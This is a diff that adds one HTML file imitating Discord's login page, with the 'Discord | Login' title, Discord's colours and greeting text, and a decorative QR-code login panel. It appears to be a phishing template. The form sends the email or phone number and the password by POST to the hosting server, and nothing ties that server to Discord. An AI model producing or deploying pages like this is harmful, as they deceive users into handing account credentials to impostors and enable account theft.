@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord | Login</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'gg sans','Helvetica Neue',Helvetica,Arial,sans-serif}
+body{background:linear-gradient(135deg,#404eed 0%,#7289da 50%,#5865f2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.card{background:#313338;width:100%;max-width:480px;border-radius:8px;padding:32px;box-shadow:0 8px 24px rgba(0,0,0,.4);display:flex;gap:32px}
+.form-side{flex:1;min-width:0}
+h1{font-size:24px;font-weight:700;color:#f2f3f5;text-align:center;margin-bottom:8px}
+.sub{font-size:16px;color:#b5bac1;text-align:center;margin-bottom:24px}
+label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
+label .req{color:#fa777c}
+input{width:100%;background:#1e1f22;border:none;border-radius:4px;padding:10px;font-size:16px;color:#dbdee1;margin-bottom:20px;outline:none}
+input:focus{outline:2px solid #5865f2}
+.forgot{display:block;font-size:14px;color:#00a8fc;text-decoration:none;margin:-12px 0 20px}
+.forgot:hover{text-decoration:underline}
+button{width:100%;background:#5865f2;color:#fff;border:none;border-radius:4px;padding:12px;font-size:16px;font-weight:600;cursor:pointer;transition:background .15s;margin-bottom:12px}
+button:hover{background:#4752c4}
+.register{font-size:14px;color:#949ba4}
+.register a{color:#00a8fc;text-decoration:none}
+.register a:hover{text-decoration:underline}
+.qr-side{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
+.qr-box{width:160px;height:160px;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;margin-bottom:20px;padding:12px}
+.qr-box svg{width:100%;height:100%}
+.qr-title{font-size:20px;font-weight:700;color:#f2f3f5;margin-bottom:8px}
+.qr-sub{font-size:14px;color:#b5bac1;line-height:1.4}
+@media(max-width:600px){.qr-side{display:none}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="form-side">
+<h1>Welcome back!</h1>
+<p class="sub">We're so excited to see you again!</p>
+<form method="POST" action="/">
+<label for="email">Email or Phone Number <span class="req">*</span></label>
+<input type="text" name="email" id="email" required autocomplete="username">
+<label for="password">Password <span class="req">*</span></label>
+<input type="password" name="password" id="password" required autocomplete="current-password">
+<a class="forgot" href="#">Forgot your password?</a>
+<button type="submit">Log In</button>
+<p class="register">Need an account? <a href="#">Register</a></p>
+</form>
+</div>
+<div class="qr-side">
+<div class="qr-box">
+<svg viewBox="0 0 21 21" fill="#000"><path d="M0 0h7v7H0zM1 1v5h5V1zM2 2h3v3H2zM14 0h7v7h-7zM15 1v5h5V1zM16 2h3v3h-3zM0 14h7v7H0zM1 15v5h5v-5zM2 16h3v3H2zM8 0h1v1H8zM10 0h1v1h-1zM12 0h1v1h-1zM8 2h1v1H8zM11 2h1v1h-1zM9 4h1v1H9zM12 4h1v1h-1zM8 6h1v1H8zM10 6h1v1h-1zM9 8h1v1H9zM11 8h1v1h-1zM13 8h1v1h-1zM15 8h1v1h-1zM17 8h1v1h-1zM19 8h1v1h-1zM8 10h1v1H8zM12 10h1v1h-1zM14 10h1v1h-1zM18 10h1v1h-1zM10 12h1v1h-1zM13 12h1v1h-1zM16 12h1v1h-1zM20 12h1v1h-1zM8 14h1v1H8zM11 14h1v1h-1zM14 14h1v1h-1zM17 14h1v1h-1zM9 16h1v1H9zM12 16h1v1h-1zM15 16h1v1h-1zM19 16h1v1h-1zM8 18h1v1H8zM10 18h1v1h-1zM13 18h1v1h-1zM16 18h1v1h-1zM20 18h1v1h-1zM9 20h1v1H9zM12 20h1v1h-1zM15 20h1v1h-1zM18 20h1v1h-1z"/></svg>
+</div>
+<p class="qr-title">Log in with QR Code</p>
+<p class="qr-sub">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+</div>
+</div>
+</body>
+</html>
